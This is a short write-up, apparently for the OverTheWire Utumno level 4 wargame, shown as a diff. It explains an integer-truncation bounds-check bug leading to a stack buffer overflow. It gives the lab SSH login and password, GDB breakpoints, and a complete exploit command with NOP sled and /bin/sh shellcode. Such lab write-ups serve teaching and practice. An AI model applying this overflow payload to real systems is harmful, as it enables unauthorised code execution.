@@ -1,2 +1,29 @@
 ssh -p 2227 utumno4@utumno.labs.overthewire.org
 pass: oogieleoga
+
+
+What this program does is `atoi` (convert a number string to an integer) from the argv[1] variable,
+After doing the following, it takes the lower 16 bytes (short) of the number and checks if it's <= 0x3F (63).
+If so, the program exits.
+Else, it copies `atoi(argv[1])` bytes from `argv[2]` into a local variable buffer b[64].
+and therefore enabling a "classic" buffer overflow.
+
+The vulnerability here is the user input validation,
+although there's bound-checking, it doesn't validate correctly since it only validates the lower 16-bits of the argument,
+this enables a user to enter whatever value he wants into the higher 16-bits of the number and thereby passing the validation, and also exploiting the `memcpy`.
+
+Bounds checking: 0x3F (63)
+
+
+&b + 0xff06 (65286) = RET
+
+# GDB
+
+b *(main+0x24)
+b *(main+0x4b)
+
+Shellcode address: 0xffffd268
+
+
+r 65536 $(python -c "print 'A' * 65286 + '\x68\xd2\xff\xff' + '\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+./utumno4 65536 $(python -c "print 'A' * 65286 + '\x68\xd2\xff\xff' + '\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
